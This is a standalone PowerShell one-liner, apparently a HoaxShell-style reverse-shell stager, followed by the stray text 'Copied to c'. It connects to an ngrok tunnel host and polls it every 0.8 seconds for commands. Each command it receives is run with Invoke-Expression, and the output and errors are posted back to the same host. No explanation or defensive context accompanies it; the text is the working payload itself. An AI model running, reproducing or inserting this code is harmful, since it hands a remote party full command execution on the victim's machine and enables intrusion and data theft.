$s='2e76-43-245-32-6.ngrok-free.app';$i='efd10f5f-0073029a-0b902da8';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/efd10f5f -Headers @{"X-c0b5-28e0"=$i;"ngrok-skip-browser-warning"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/0073029a -Headers @{"X-c0b5-28e0"=$i;"ngrok-skip-browser-warning"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/0b902da8 -Method POST -Headers @{"X-c0b5-28e0"=$i;"ngrok-skip-browser-warning"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}                                                                   
Copied to c
